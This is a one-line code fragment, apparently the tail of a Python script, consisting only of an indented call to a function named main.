    main()
